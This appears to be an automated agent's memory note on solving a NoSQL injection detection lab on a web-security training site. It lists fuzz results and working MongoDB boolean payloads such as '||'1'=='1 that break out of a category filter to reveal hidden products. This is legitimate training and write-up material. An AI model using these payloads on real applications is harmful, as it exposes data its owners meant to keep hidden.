---
metadata:
  node_type: memory
name: "lab-nosql-injection-detection"
description: "Solved NoSQL injection detection lab (arm A) via boolean OR payload in category filter; banner flipped."
last_updated: 2026-10-10T11:27:36+08:00
created: 2026-10-10T11:27:36+08:00
---

## 2026-02 arm A — Detecting NoSQL injection

Path: `/web-security/nosql-injection/lab-nosql-injection-detection` (canonical, page_read direct hit, no 404 fallback needed).
Widget lab_id: `8878778FC200A649AA733122E9E01376459C5E0B2A67F4AB76EF510E2659D168`.
Instance: `https://0aeb00e20349fde38283a1c600f60053.web-security-academy.net/` (reused:false, no prior state).

Target surface: `/filter?category=<value>` — MongoDB-backed category filter.
Note: `category=Gifts` is a dead label (empty tile list), real categories are
Lifestyle / Pets / Tech gifts / Clothing, shoes and accessories.

Probe (one envelope, url_fuzz over `/filter?category=FUZZ`):
- `Lifestyle`                      -> 200, 4779 B   (baseline)
- `Lifestyle'||'1'=='1`            -> 200, 9927 B   (injected TRUE, full-ish set)
- `'||'1'=='1`                     -> 200, 12454 B  (injected TRUE, widest set)
- `Lifestyle'&&'1'=='1`            -> 500, 5774 B   (syntax error page)
- `Lifestyle'&&'1'=='2`            -> 500, 5774 B

Read: `page-type string` in the shell-style `$where`/string-query path — `'` breaks out,
`||` chains a JS expression that evaluates truthy for every document, `&&` produced a
server error. Difference 12454 vs 9927: the widest payload is the reliable "all docs" form.

Solve: `banner_verdict` on the base URL -> `solved:true`, congrats line
`<h4>Congratulations, you solved the lab!</h4>`. Solved on the `'||'1'=='1` request itself
(unreleased products entered the listing), confirmed by the banner.

Lesson: for this family the detection probe IS the solve — a truthy boolean that widens the
result set to all documents satisfies "display unreleased products". No second-stage
extraction needed. `&&` yielding 500 is itself a good injection fingerprint.
